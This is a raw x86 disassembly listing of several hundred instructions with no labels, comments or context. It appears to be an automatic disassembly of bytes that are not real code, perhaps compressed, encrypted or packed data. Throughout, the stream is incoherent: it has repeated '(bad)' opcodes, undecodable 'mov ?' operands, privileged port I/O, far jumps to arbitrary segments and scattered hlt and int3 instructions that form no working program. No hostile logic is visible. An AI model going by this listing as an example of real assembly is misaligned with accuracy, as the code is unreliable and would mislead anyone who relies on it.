  440e49:	add    DWORD PTR [eax+0x47],ebx
  440e4c:	pop    ebx
  440e4d:	sub    BYTE PTR [eax+0x32],al
  440e50:	test   al,0x65
  440e52:	dec    eax
  440e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e54:	mov    cl,cl
  440e56:	inc    esp
  440e57:	in     eax,0x76
  440e59:	mov    dl,0xe8
  440e5b:	pop    esi
  440e5c:	add    DWORD PTR ds:0xa1eec8c0,0xeef95389
  440e66:	pop    ds
  440e67:	cmc    
  440e68:	retf   0x78cf
  440e6b:	xchg   ebx,eax
  440e6c:	mov    al,0x82
  440e6e:	push   ecx
  440e6f:	aad    0xc1
  440e71:	add    edx,DWORD PTR [ecx+0x7aa0437a]
  440e77:	mov    DWORD PTR [edi-0xad12849],eax
  440e7d:	ds lahf 
  440e7f:	sub    al,0x63
  440e81:	sbb    al,0x85
  440e83:	inc    esi
  440e84:	retf   
  440e85:	nop
  440e86:	pop    ds
  440e87:	(bad)  
  440e88:	aam    0xb2
  440e8a:	mov    al,0xd7
  440e8c:	stos   BYTE PTR es:[edi],al
  440e8d:	and    al,0x61
  440e8f:	imul   ebx,edi,0xffffff87
  440e92:	ds mov eax,0x2d37ac27
  440e98:	push   esp
  440e99:	xchg   DWORD PTR [ebx-0x194b7644],edi
  440e9f:	jle    0x440e7d
  440ea1:	add    al,0x51
  440ea3:	pop    esi
  440ea4:	gs call 0x654d81c9
  440eaa:	ret    0xb030
  440ead:	pop    ebp
  440eae:	sbb    DWORD PTR [ebx+0x558367f2],0x7888cd69
  440eb8:	fdivr  DWORD PTR [esi+0x1f]
  440ebb:	xlat   BYTE PTR ds:[ebx]
  440ebc:	fstp   st(3)
  440ebe:	pop    ss
  440ebf:	sub    bl,BYTE PTR [eax+0x52]
  440ec2:	and    al,0xd4
  440ec4:	add    DWORD PTR [eax-0x2a72c1f3],edx
  440eca:	into   
  440ecb:	ret    0x9789
  440ece:	bound  ebx,QWORD PTR [edx]
  440ed0:	pop    edx
  440ed1:	mov    esi,0x2424105
  440ed6:	repnz mov ebp,0xef3ec057
  440edd:	mov    dh,0x60
  440edf:	aad    0xfb
  440ee1:	lds    esi,FWORD PTR [eax]
  440ee3:	lock add dh,BYTE PTR [edi+eiz*2-0x2c]
  440ee8:	lea    eax,[ecx+0xd]
  440eeb:	shr    bl,1
  440eed:	xor    DWORD PTR [esi+edi*4],eax
  440ef0:	mov    gs,WORD PTR ds:0xa0b4e391
  440ef6:	mov    DWORD PTR ds:0xd5a83c8a,eax
  440efc:	and    DWORD PTR [edx+0x8],0x26c20524
  440f03:	inc    edx
  440f04:	mov    BYTE PTR [ebx],cl
  440f06:	xchg   edi,eax
  440f07:	jp     0x440f2c
  440f09:	push   edi
  440f0a:	adc    esi,DWORD PTR [edx-0x6ebbfdb7]
  440f10:	mov    al,ds:0x6c7819b
  440f15:	les    ebx,FWORD PTR [edi]
  440f17:	cmp    DWORD PTR [ecx],ebp
  440f19:	scas   al,BYTE PTR es:[edi]
  440f1a:	xlat   BYTE PTR ds:[ebx]
  440f1b:	cmp    dh,0xb3
  440f1e:	push   ebp
  440f1f:	aam    0x9d
  440f21:	jg     0x440f32
  440f23:	sar    al,cl
  440f25:	jb     0x440ef1
  440f27:	push   cs
  440f28:	jne    0x440eb2
  440f2a:	pop    ds
  440f2b:	mov    DWORD PTR [ecx-0x57a35d27],ebx
  440f31:	psrad  mm2,mm4
  440f34:	mov    eax,0x3c0a43e6
  440f39:	pop    ebx
  440f3a:	mov    edi,0x8238837
  440f3f:	adc    bl,dl
  440f41:	lds    edx,FWORD PTR [eax]
  440f43:	inc    edi
  440f44:	iret   
  440f45:	add    eax,0x325e2976
  440f4a:	inc    ecx
  440f4b:	out    dx,al
  440f4c:	cs icebp 
  440f4e:	pusha  
  440f4f:	inc    ecx
  440f50:	sar    BYTE PTR [eax+0x76a49bd1],0xb3
  440f57:	aam    0x5d
  440f59:	aam    0x18
  440f5b:	daa    
  440f5c:	lods   al,BYTE PTR ds:[esi]
  440f5d:	iret   
  440f5e:	mov    esi,0xb2e789e8
  440f63:	ja     0x440f78
  440f65:	cmp    DWORD PTR [eax],eax
  440f67:	pusha  
  440f68:	nop
  440f69:	add    al,BYTE PTR [eax-0x5852394a]
  440f6f:	out    dx,eax
  440f70:	mov    al,ds:0x87841150
  440f75:	mov    cl,0x75
  440f77:	mov    eax,ds:0x7440dd8e
  440f7c:	sbb    DWORD PTR [edx-0xcbbfa4c],eax
  440f82:	pusha  
  440f83:	add    eax,0xf8ebe93e
  440f88:	jle    0x440f71
  440f8a:	pop    ebx
  440f8b:	or     eax,0xdd1e7d4f
  440f90:	enter  0x2fb9,0x5d
  440f94:	xlat   BYTE PTR cs:[ebx]
  440f96:	repnz aam 0xe2
  440f99:	adc    edx,edx
  440f9b:	stos   BYTE PTR es:[edi],al
  440f9c:	mov    eax,ds:0x88c838af
  440fa1:	and    DWORD PTR [ecx-0x45ca02ba],0x49
  440fa8:	add    eax,0xda1c9c03
  440fad:	dec    edx
  440fae:	je     0x440f49
  440fb0:	pop    ebx
  440fb1:	jbe    0x440fd2
  440fb3:	xlat   BYTE PTR ds:[ebx]
  440fb4:	and    ch,BYTE PTR [esi]
  440fb6:	out    0x3d,eax
  440fb8:	jbe    0x440fa4
  440fba:	ja     0x440f91
  440fbc:	inc    eax
  440fbd:	mov    ds:0x9a3dd3f2,eax
  440fc2:	xchg   al,ah
  440fc4:	mov    BYTE PTR [ecx-0x1f],ah
  440fc7:	or     DWORD PTR [ecx],esi
  440fc9:	xchg   ecx,eax
  440fca:	sbb    dh,dl
  440fcc:	ror    BYTE PTR [ebx-0x40],1
  440fcf:	pop    esp
  440fd0:	inc    esi
  440fd1:	sbb    al,0x6a
  440fd3:	mov    ah,0x68
  440fd5:	out    0xd2,al
  440fd7:	push   ds
  440fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440fd9:	call   0xea8d:0x9d8a44e0
  440fe0:	pop    esi
  440fe1:	jmp    0xd72f:0x69e8c3f9
  440fe8:	add    edx,DWORD PTR [eax]
  440fea:	lahf   
  440feb:	daa    
  440fec:	and    DWORD PTR [esi+eax*1-0x33ba70c4],edx
  440ff3:	retf   
  440ff4:	iret   
  440ff5:	fisubr WORD PTR ds:0xd0b6b7d6
  440ffb:	shl    BYTE PTR [esi],1
  440ffd:	jae    0x440f98
  440fff:	aad    0x4e
  441001:	rcr    ebp,1
  441003:	mov    edx,DWORD PTR [eax+eax*1]
  441006:	mov    BYTE PTR ds:0x7690258f,dl
  44100c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44100d:	(bad)  
  44100e:	jae    0x440f93
  441010:	adc    DWORD PTR [ebx+0x2ab72e4],esi
  441016:	pushf  
  441017:	sub    eax,0xe287c9ad
  44101c:	dec    ebx
  44101d:	jno    0x44103d
  44101f:	xchg   ebp,eax
  441020:	sar    BYTE PTR [ebx+0x37],1
  441023:	test   BYTE PTR [esp+edi*8],cl
  441026:	pop    es
  441027:	pushf  
  441028:	pop    eax
  441029:	dec    ebp
  44102a:	dec    ecx
  44102b:	(bad)  
  44102c:	in     al,dx
  44102d:	mov    al,ds:0x42a6f021
  441032:	or     BYTE PTR [edi+ecx*4],dl
  441035:	or     DWORD PTR [edx-0xd895f8f],0x2e3af617
  44103f:	imul   ebp,DWORD PTR [eax+0x2],0x4e51e6b0
  441046:	(bad)  [esi+0x1d1f89ba]
  44104c:	cmp    al,0x49
  44104e:	shl    dh,1
  441050:	mov    al,ds:0x81d6e09c
  441055:	mov    ebp,0x849ef895
  44105a:	xor    eax,0x5ab88534
  44105f:	mov    cl,0xb3
  441061:	pop    edx
  441062:	pop    ds
  441063:	popf   
  441064:	mov    edx,esp
  441066:	js     0x441072
  441068:	push   ds
  441069:	imul   edi,DWORD PTR [ebp*8-0x3c3fd8b],0x30
  441071:	out    dx,al
  441072:	(bad)  
  441073:	jo     0x440ffd
  441075:	aaa    
  441076:	out    0x9b,eax
  441078:	push   ecx
  441079:	jne    0x441011
  44107b:	mov    bh,0x3
  44107d:	add    DWORD PTR [edx],eax
  44107f:	mov    ah,0x11
  441081:	xor    dl,BYTE PTR [esp+esi*1-0x4321ba7d]
  441088:	mov    edi,edx
  44108a:	jecxz  0x441027
  44108c:	dec    ecx
  44108d:	mov    ds,WORD PTR [ebp+0x201fb122]
  441093:	pmuludq mm7,mm7
  441096:	repnz in al,0xc7
  441099:	int3   
  44109a:	jno    0x441035
  44109c:	mov    DWORD PTR [ebp+0x78],esp
  44109f:	hlt    
  4410a0:	xchg   BYTE PTR [edx-0x69636ca8],bh
  4410a6:	loopne 0x4410d6
  4410a8:	inc    ecx
  4410a9:	mov    ebp,0x215a6e3
  4410ae:	loopne 0x44107f
  4410b0:	not    edi
  4410b2:	hlt    
  4410b3:	sahf   
  4410b4:	jae    0x44110f
  4410b6:	push   ds
  4410b7:	shl    DWORD PTR ds:0x9eaa269a,1
  4410bd:	les    ecx,FWORD PTR ds:0x7327b3d4
  4410c3:	inc    edi
  4410c4:	mov    ?,ebx
  4410c6:	cs pop esp
  4410c8:	mov    DWORD PTR [ebp-0xc92b4ec],eax
  4410ce:	sub    ah,bl
  4410d0:	jg     0x44111b
  4410d2:	or     BYTE PTR [ecx],0xde
  4410d5:	add    ah,BYTE PTR [esi+0x7349c2a6]
  4410db:	xor    eax,0x831e12a8
  4410e0:	mov    esi,DWORD PTR [ecx]
  4410e2:	clc    
  4410e3:	fldz   
  4410e5:	inc    BYTE PTR [ebp-0x2c]
  4410e8:	cmp    DWORD PTR [edx-0x3ca20884],0xffffff88
  4410ef:	in     al,dx
  4410f0:	mov    bh,0xb7
  4410f2:	mov    ss:0x47e39b01,al
  4410f8:	or     BYTE PTR [ebx],dh
  4410fa:	aaa    
  4410fb:	mov    edi,0x825605ab
  441100:	add    edi,DWORD PTR [edx]
  441102:	sti    
  441103:	sub    ebx,DWORD PTR [esi]
  441105:	sub    DWORD PTR [edi],esi
  441107:	lds    esi,FWORD PTR [ebp+edx*2+0x6d09fa02]
  44110e:	ror    BYTE PTR [ecx-0x2bde308a],0x10
  441115:	outs   dx,DWORD PTR ds:[esi]
  441116:	mov    esi,0x3457e13e
  44111b:	mov    al,0x89
  44111d:	lahf   
  44111e:	add    esi,DWORD PTR ds:0xed141adf
  441124:	inc    DWORD PTR [eax]
  441126:	outs   dx,BYTE PTR ds:[esi]
  441127:	pop    edi
  441128:	int    0xcc
  44112a:	cmp    BYTE PTR [ebp+0x44],ah
  44112d:	retf   0xb98c
  441130:	mov    BYTE PTR [ecx],ah
  441132:	dec    esi
  441133:	mov    WORD PTR [ecx],?
  441135:	mov    ds:0x58a9272,eax
  44113a:	cs push cs
  44113c:	dec    edx
  44113d:	sbb    eax,0xc75ac82a
  441142:	sbb    esp,ebp
  441144:	mov    DWORD PTR [ecx-0x53870031],ecx
  44114a:	int    0x9b
  44114c:	push   esp
  44114d:	ss or  al,0x8a
  441150:	pop    es
  441151:	add    edx,DWORD PTR [edi+eiz*8+0x1c]
  441155:	outs   dx,BYTE PTR ds:[esi]
  441156:	ds mov WORD PTR cs:[ecx-0x5ed39a6c],ds
  44115e:	mov    esp,0x5d98e55
  441163:	aam    0x22
  441165:	sub    esp,DWORD PTR [esi]
  441167:	push   0xa9f2b2dc
  44116c:	mov    ecx,ebp
  44116e:	(bad)  
  44116f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441170:	mov    ds:0x8b3bfd47,al
  441175:	add    eax,0xd241e606
  44117a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44117b:	jno    0x441126
  44117d:	out    dx,eax
  44117e:	adc    dl,0x89
  441181:	out    0xee,eax
  441183:	pop    ss
  441184:	clc    
  441185:	cmp    edi,esi
  441187:	adc    DWORD PTR [ebp+0x15],ebx
  44118a:	xor    BYTE PTR [eax-0xb700290],dl
  441190:	mov    ah,0xbe
  441192:	dec    esi
  441193:	outs   dx,DWORD PTR ds:[esi]
  441194:	mov    edi,esi
  441196:	(bad)  
  441197:	call   0xdfd4d861
  44119c:	jmp    0x4411d0
  44119e:	ss test al,0x2b
  4411a1:	bound  esp,QWORD PTR [eax+edi*2+0x7d977589]
  4411a8:	popf   
  4411a9:	loop   0x44113c
  4411ab:	call   0xde901413
  4411b0:	jns    0x4411d5
  4411b2:	adc    ebx,ebx
  4411b4:	fisub  DWORD PTR [ebp+0x5df6215d]
  4411ba:	lahf   
  4411bb:	ja     0x441210
  4411bd:	fadd   st,st(3)
  4411bf:	mov    ecx,0x18fc02dd
  4411c4:	lahf   
  4411c5:	mov    dh,0xf6
  4411c7:	pop    es
  4411c8:	dec    edi
  4411c9:	stos   DWORD PTR es:[edi],eax
  4411ca:	pusha  
  4411cb:	out    0x37,eax
  4411cd:	retf   
  4411ce:	ror    DWORD PTR [ebx-0x3a],0x41
  4411d2:	mov    ah,dl
  4411d4:	jmp    0x44119e
  4411d6:	cmp    DWORD PTR [esi-0xf],ebp
  4411d9:	cmp    BYTE PTR [ebx],al
  4411db:	cmp    eax,0x9ed03988
  4411e0:	(bad)  
  4411e1:	clc    
  4411e2:	cmp    eax,0xed8a9c4d
  4411e7:	daa    
  4411e8:	lods   al,BYTE PTR ds:[esi]
  4411e9:	rcl    DWORD PTR [edx+0x131fc6d4],1
  4411ef:	dec    esp
  4411f0:	jns    0x4411e5
  4411f2:	pop    ds
  4411f3:	xchg   ebp,eax
  4411f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4411f5:	hlt    
  4411f6:	cmp    BYTE PTR [ecx-0x69],0x15
  4411fa:	mov    esp,0xe2379bdb
  4411ff:	sub    eax,0xd492d5b4
  441204:	push   ebx
  441205:	sahf   
  441206:	add    al,0x6
  441208:	and    ch,BYTE PTR ds:0xfc2d406
  44120e:	ret    
  44120f:	idiv   bh
  441211:	xor    DWORD PTR [ecx+0x5d],0xffffffd5
  441215:	call   FWORD PTR ds:0xf405f70d
  44121b:	dec    edx
  44121c:	jno    0x44124f
  44121e:	fdivr  DWORD PTR [eax-0x79]
  441221:	add    dh,BYTE PTR [edx-0x1c]
  441224:	addr16 jle 0x441228
  441227:	mov    eax,0x611f54d0
  44122c:	xor    eax,0x72b68b8
  441231:	sub    eax,ebp
  441233:	iret   
  441234:	aaa    
  441235:	sbb    eax,0xd9abf180
  44123a:	lods   al,BYTE PTR ds:[esi]
  44123b:	add    ebx,DWORD PTR [ecx]
  44123d:	mov    ebp,0x6588b25c
  441242:	js     0x441204
  441244:	xor    al,0x3a
  441246:	mov    esp,0x2c037329
  44124b:	(bad)  
  44124c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44124d:	pusha  
  44124e:	mov    edx,0x7e9aac73
  441253:	arpl   WORD PTR [ebp-0x11],cx
  441256:	sbb    eax,0x3123cd94
  44125b:	ret    
  44125c:	and    DWORD PTR [edx],eax
  44125e:	push   0x12313416
  441263:	mov    bl,0x14
  441265:	(bad)  
  441266:	sbb    DWORD PTR [esi],edi
  441268:	mov    bl,cl
  44126a:	lock adc ebx,DWORD PTR [ebx]
  44126d:	es scas al,BYTE PTR es:[edi]
  44126f:	aam    0x21
  441271:	jns    0x4412e4
  441273:	enter  0xbe88,0x93
  441277:	mov    BYTE PTR [edi+0x549165bb],ah
  44127d:	mov    edi,esp
  44127f:	aas    
  441280:	pop    eax
  441281:	mov    bl,0x8
  441283:	pop    ebx
  441284:	or     eax,DWORD PTR [ebx]
  441286:	loopne 0x441275
  441288:	cwde   
  441289:	cwde   
  44128a:	or     BYTE PTR [eax+0x13600d98],ah
  441290:	imul   eax,DWORD PTR [esi+ebx*8],0x85e47c78
  441297:	aam    0x6
  441299:	add    BYTE PTR [esi+0x2c6887fb],al
  44129f:	fimul  DWORD PTR [eax-0x44a8a59b]
  4412a5:	jne    0x44122e
  4412a7:	fdivr  QWORD PTR [eax+0x2]
  4412aa:	cmp    ah,BYTE PTR [eax-0x51]
  4412ad:	loope  0x4412ba
  4412af:	test   eax,0x4761be29
  4412b4:	jnp    0x44128d
  4412b6:	inc    eax
  4412b7:	repz jns 0x44129b
  4412ba:	out    0x4e,eax
  4412bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4412bd:	add    eax,0xdf849900
  4412c2:	cdq    
  4412c3:	outs   dx,DWORD PTR ds:[esi]
  4412c4:	mov    WORD PTR [edi+ebx*1+0x65538341],cs
  4412cb:	gs jmp 0x44130c
  4412ce:	pop    eax
  4412cf:	inc    edi
  4412d0:	push   0xffffffd8
  4412d2:	or     ecx,edx
  4412d4:	into   
  4412d5:	addps  xmm1,XMMWORD PTR [ebp+0x6]
  4412d9:	xor    DWORD PTR [esi+esi*8-0x19],edi
  4412dd:	fstp   QWORD PTR [esp+esi*8-0x2f103677]
  4412e4:	dec    ecx
  4412e5:	xlat   BYTE PTR ds:[ebx]
  4412e6:	sti    
  4412e7:	xchg   esp,eax
  4412e8:	test   DWORD PTR [edx],0x162d9082
  4412ee:	iret   
  4412ef:	jae    0x4412fd
  4412f1:	push   ebx
  4412f2:	add    eax,0xe585891c
  4412f7:	sbb    ebp,DWORD PTR [esi]
  4412f9:	pop    edi
  4412fa:	into   
  4412fb:	call   0xe30e151c
  441300:	sbb    BYTE PTR [edi],bh
  441302:	dec    ebx
  441303:	inc    esp
  441304:	cmp    ah,BYTE PTR [esi+0x1e]
  441307:	mov    edi,0xb3ca86fa
  44130c:	sub    al,0xb
  44130e:	test   esp,edx
  441310:	xchg   esp,eax
  441311:	mov    ebp,0xa68e4c01
  441316:	(bad)  
  441317:	mov    ch,0x89
  441319:	mov    ecx,0x4bd44622
  44131e:	push   eax
  44131f:	test   eax,0xd71b0ac2
  441324:	icebp  
  441325:	cmp    DWORD PTR [edx],0x34
  441328:	std    
  441329:	push   eax
  44132a:	dec    ebx
  44132b:	fimul  WORD PTR [eax-0x72c53765]
  441331:	rcr    edi,cl
  441333:	ror    BYTE PTR [esi],1
  441335:	add    dl,al
  441337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441338:	pop    ecx
  441339:	jle    0x4412d6
  44133b:	mov    ch,0xa5
  44133d:	call   0xed58ce58
  441342:	das    
  441343:	sti    
  441344:	mov    cl,0xc2
  441346:	retf   0x168a
  441349:	mov    ah,0x27
  44134b:	xlat   BYTE PTR ds:[ebx]
  44134c:	sar    DWORD PTR [esi-0x55],1
  44134f:	add    ch,BYTE PTR [ecx]
  441351:	loop   0x4413a5
  441353:	sub    BYTE PTR [ecx+0x46615f11],cl
  441359:	icebp  
  44135a:	(bad)  
  44135c:	mov    esp,0xcaabe30b
  441361:	fld    QWORD PTR [ebp+0x44a2372c]
  441367:	cmp    ebx,DWORD PTR ds:0x45b91fba
  44136d:	(bad)  
  44136e:	out    0xc5,eax
  441370:	mov    esp,0xa5d42101
  441375:	outs   dx,DWORD PTR ds:[esi]
  441376:	fisttp QWORD PTR [ecx+0x61]
  441379:	std    
  44137a:	imul   ebp,DWORD PTR [eax-0x77],0xffffffd1
  44137e:	cwde   
  44137f:	xor    eax,0x8f628092
  441384:	cmp    eax,0x24de9a1c
  441389:	in     eax,dx
  44138a:	in     eax,dx
  44138b:	fyl2xp1 
  44138d:	cld    
  44138e:	ss mov DWORD PTR gs:[ebx-0x4486de35],ecx
  441396:	fst    QWORD PTR [edx+0x56]
  441399:	add    eax,DWORD PTR [ebx+eax*1-0x13]
  44139d:	mov    fs,ecx
  44139f:	and    eax,0x271f3791
  4413a4:	dec    ecx
  4413a5:	cmc    
  4413a6:	std    
  4413a7:	mov    ds:0xb896861c,al
  4413ac:	and    BYTE PTR [edx+0x6e],dl
  4413af:	dec    esi
  4413b0:	dec    eax
  4413b1:	ds in  al,dx
  4413b3:	pop    edi
  4413b4:	fisubr DWORD PTR [esi+0x97ac96e]
  4413ba:	in     al,dx
  4413bb:	jecxz  0x4413c5
  4413bd:	jne    0x441364
  4413bf:	call   0x44d6:0x65261c68
  4413c6:	cdq    
  4413c7:	cmp    DWORD PTR [ecx-0x49],0xffffff82
  4413cb:	lock mov cl,dh
  4413ce:	cmp    ecx,DWORD PTR [esi-0x17e6f8cd]
  4413d4:	adc    al,BYTE PTR [edx]
  4413d6:	stos   BYTE PTR es:[edi],al
  4413d7:	push   edi
  4413d8:	in     eax,0x42
  4413da:	fs xchg ecx,eax
  4413dc:	pop    eax
  4413dd:	xchg   ebx,eax
  4413de:	pusha  
  4413df:	mov    ds:0x97894437,eax
  4413e4:	push   es
  4413e5:	mov    ecx,0x9030ab6a
  4413ea:	jecxz  0x4413ea
  4413ec:	(bad)  
  4413ed:	and    cl,BYTE PTR [ebx+edi*1]
  4413f0:	fld    TBYTE PTR fs:[ecx+0x3d]
  4413f4:	add    al,0xb5
  4413f6:	add    eax,0x9735887d
  4413fb:	and    bl,BYTE PTR ds:[ebp+eax*4-0x45]
  441400:	push   edi
  441401:	daa    
  441402:	cmp    dl,BYTE PTR [ebp-0x38]
  441405:	shl    BYTE PTR [ebp-0x16],1
  441408:	and    BYTE PTR [ebx+0x482b0161],ch
  44140e:	leave  
  44140f:	scas   al,BYTE PTR es:[edi]
  441410:	test   DWORD PTR [edx+0x4a022ad0],ebx
  441416:	ins    BYTE PTR es:[edi],dx
  441417:	pop    ebp
  441418:	test   BYTE PTR [edx],0x29
  44141b:	xor    al,0x60
  44141d:	xor    esi,DWORD PTR [esi-0xe367637]
  441423:	rol    DWORD PTR ds:0x807ed20e,0x5
  44142a:	jo     0x441409
  44142c:	loop   0x441471
  44142e:	mov    cl,BYTE PTR [ebx-0x7d]
  441431:	mov    esi,0xa6ed136d
  441436:	dec    ecx
  441437:	ins    BYTE PTR es:[edi],dx
  441438:	call   0x1084f731
  44143d:	push   cs
  44143e:	in     al,dx
  44143f:	aam    0xb0
  441441:	sub    al,0x47
  441443:	cli    
  441444:	xlat   BYTE PTR ds:[ebx]
  441445:	push   esi
  441446:	mov    DWORD PTR [ecx+0x3960d27b],0xd1bef7a9
  441450:	cs (bad) 
  441452:	popf   
  441453:	aam    0x75
  441455:	shl    DWORD PTR [ebp+ebp*4+0x5d],0x69
  44145a:	mov    al,0x6d
  44145c:	mov    al,0x5f
  44145e:	lds    edx,FWORD PTR [ebp-0x4e]
  441461:	xchg   edi,eax
  441462:	pop    ds
  441463:	cmp    DWORD PTR [edi-0x2705ac49],esp
  441469:	add    eax,0xa66936f0
  44146e:	ret    
  44146f:	mov    DWORD PTR [edi],esi
  441471:	int3   
  441472:	pop    ds
  441473:	pop    ebx
  441474:	cmp    eax,DWORD PTR [ebx+0x4c]
  441477:	sar    DWORD PTR [edx],cl
  441479:	dec    eax
  44147a:	lahf   
  44147b:	aam    0x3f
  44147d:	lahf   
  44147e:	stos   BYTE PTR es:[edi],al
  44147f:	adc    DWORD PTR [ebx-0x77f79f69],esp
  441485:	jae    0x44148d
  441487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441488:	adc    dl,al
  44148a:	ror    DWORD PTR ds:0x5f4e024e,1
  441490:	jo     0x4414af
  441492:	push   ecx
  441493:	imul   ebx,DWORD PTR [ecx],0x76
  441496:	pop    ds
  441497:	gs stos BYTE PTR es:[edi],al
  441499:	lahf   
  44149a:	test   eax,0x19beb4d2
  44149f:	aam    0xe0
  4414a1:	sbb    ecx,DWORD PTR [ecx-0x95d9337]
  4414a7:	into   
  4414a8:	mov    BYTE PTR [ebx+0x584e97f9],bh
  4414ae:	xchg   ecx,eax
  4414af:	inc    edx
  4414b0:	xchg   edx,eax
  4414b1:	mov    dh,BYTE PTR [ebx+0x6d]
  4414b4:	mov    eax,ecx
  4414b6:	rep outs dx,DWORD PTR ds:[esi]
  4414b8:	out    dx,al
  4414b9:	mov    al,ds:0xd35be044
  4414be:	push   eax
  4414bf:	fs xchg edi,eax
  4414c1:	jmp    0x42940f5d
  4414c6:	cmp    BYTE PTR [ecx-0x2b34219a],dh
  4414cc:	scas   eax,DWORD PTR es:[edi]
  4414cd:	jp     0x4414e1
  4414cf:	ret    
  4414d0:	es and al,0xb8
  4414d3:	stc    
  4414d4:	mov    BYTE PTR [edi],al
  4414d6:	add    dh,al
  4414d8:	sub    dh,BYTE PTR [ebx]
  4414da:	fisttp QWORD PTR [esi+0x2d]
  4414dd:	add    ah,BYTE PTR [esi-0x55]
  4414e0:	inc    eax
  4414e1:	pop    edi
  4414e2:	add    BYTE PTR [ebp-0x27],bl
  4414e5:	xor    DWORD PTR [esi],ebx
  4414e7:	divps  xmm4,XMMWORD PTR [ebp+esi*8-0x68]
  4414ec:	clc    
  4414ed:	fwait
  4414ee:	and    edx,edi
  4414f0:	jo     0x44156c
  4414f2:	dec    esp
  4414f3:	mov    ecx,0x8dd51b72
  4414f8:	mov    BYTE PTR [ebx+0x41],ch
  4414fb:	test   al,0x3a
  4414fd:	adc    eax,0x8bb9d1ae
  441502:	xchg   ebx,eax
  441503:	xor    BYTE PTR [ecx-0x1ee82f6c],cl
  441509:	rcl    dh,1
  44150b:	leave  
  44150c:	mov    cs,WORD PTR [ebx]
  44150e:	out    dx,eax
  44150f:	mov    esp,0xd41dd9ed
  441514:	pusha  
  441515:	daa    
  441516:	rcl    ah,cl
  441518:	mov    WORD PTR [eax],?
  44151a:	dec    esi
  44151b:	mov    al,ds:0xce97c178
  441520:	lea    ebp,[ecx+0x3e]
  441523:	out    0xe9,eax
  441525:	enter  0x548a,0x7c
  441529:	jae    0x441573
  44152b:	sar    DWORD PTR [ebx],cl
  44152d:	mov    al,0xf6
  44152f:	fwait
  441530:	gs adc al,0x50
  441533:	ror    BYTE PTR [ebx-0x1d],1
  441536:	rcr    DWORD PTR [eax],0x73
  441539:	es popa 
  44153b:	jnp    0x441528
  44153d:	adc    DWORD PTR [eax+0x28c5326b],0x6b
  441544:	push   esp
  441545:	add    DWORD PTR [edx+0x33],edx
  441548:	sbb    DWORD PTR [ecx-0x2b],edx
  44154b:	mov    DWORD PTR ss:[edx-0x56],esp
  44154f:	xchg   edi,eax
  441550:	mov    bh,0x99
  441552:	xchg   ebx,eax
  441553:	aas    
  441554:	mov    BYTE PTR [ebx],al
  441556:	jecxz  0x4415b7
  441558:	rcl    BYTE PTR [edx+0xd9ad5cb],cl
  44155e:	(bad)  
  44155f:	imul   esi,DWORD PTR [eax],0xffffffbf
  441562:	aad    0xc8
  441564:	xchg   bl,al
  441566:	jmp    0x982b:0xdd8a1ef8
  44156d:	jl     0x441510
  44156f:	retf   
  441570:	push   ds
  441571:	or     eax,0x44c83127
  441576:	test   BYTE PTR [edi-0x17],ah
  441579:	pushf  
  44157a:	mov    edx,fs
  44157c:	hlt    
  44157d:	loopne 0x4415af
  44157f:	add    DWORD PTR [ebx-0x44],edi
  441582:	pusha  
  441583:	mov    ecx,0xca85c58e
  441588:	or     BYTE PTR [eax],cl
  44158a:	xchg   DWORD PTR [edx+ebx*4+0x60915900],ebp
  441591:	or     eax,0x45
  441594:	scas   al,BYTE PTR es:[edi]
  441595:	sub    bl,BYTE PTR [esi]
  441597:	stos   DWORD PTR es:[edi],eax
  441598:	mov    ds:0x367525d0,al
  44159d:	pop    esp
  44159e:	xchg   esi,eax
  44159f:	pushf  
  4415a0:	mov    ecx,0x9a545a1d
  4415a5:	mov    ch,0xcd
  4415a7:	xor    BYTE PTR [ecx-0x11],cl
  4415aa:	push   edi
  4415ab:	std    
  4415ac:	stos   DWORD PTR es:[edi],eax
  4415ad:	dec    ebx
  4415ae:	ins    DWORD PTR es:[edi],dx
  4415af:	inc    esp
  4415b0:	nop
  4415b1:	imul   eax,DWORD PTR [ebp-0x65],0xb024c5e7
  4415b8:	sub    DWORD PTR [edx],eax
  4415ba:	push   0xe7cc5240
  4415bf:	outs   dx,DWORD PTR ds:[esi]
  4415c0:	or     eax,0x1ae71e5d
  4415c5:	and    ah,BYTE PTR [eax-0x47]
  4415c8:	es rol ebp,cl
  4415cb:	aad    0x5f
  4415cd:	test   BYTE PTR [edx-0x6a],0x9e
  4415d1:	jbe    0x44160d
  4415d3:	or     esi,DWORD PTR [ebx+edi*4+0x5a]
  4415d7:	dec    ecx
  4415d8:	mov    dh,0xae
  4415da:	out    dx,al
  4415db:	js     0x44164c
  4415dd:	(bad)  
  4415de:	pop    edi
  4415df:	xor    al,0xd
  4415e1:	lods   al,BYTE PTR ds:[esi]
  4415e2:	fld    DWORD PTR [edi+0xc]
  4415e5:	stos   DWORD PTR es:[edi],eax
  4415e6:	mov    edi,0x3cc9ed9e
  4415eb:	fwait
  4415ec:	mov    bl,al
  4415ee:	xor    dh,BYTE PTR [edi-0x7c2a2dab]
  4415f4:	mov    ah,0xc5
  4415f6:	dec    esi
  4415f7:	mov    ebx,0x5f159102
  4415fc:	dec    eax
  4415fd:	xchg   ebp,eax
  4415fe:	retf   0xb71f
  441601:	sbb    dh,BYTE PTR [ebx+0x65]
  441604:	push   eax
  441605:	or     esi,DWORD PTR [ebx]
  441607:	jne    0x441591
  441609:	popf   
  44160a:	and    ebp,esi
  44160c:	mov    ds:0x83d47c14,al
  441611:	neg    BYTE PTR [ebp-0x13]
  441614:	xor    esi,DWORD PTR [edi+edi*1-0x7c9877ce]
  44161b:	sbb    esp,DWORD PTR [eax-0x72dc076c]
  441621:	add    bl,BYTE PTR [edi+ebp*2]
  441624:	hlt    
  441625:	mov    ecx,0xd7b4c397
  44162a:	pop    ecx
  44162b:	mov    cl,0x83
  44162d:	inc    ebp
  44162e:	lahf   
  44162f:	cmc    
  441630:	push   edi
  441631:	cmp    al,0xd2
  441633:	data16 adc bl,bl
  441636:	stos   BYTE PTR es:[edi],al
  441637:	aam    0xe7
  441639:	push   ss
  44163a:	mov    bl,al
  44163c:	inc    ecx
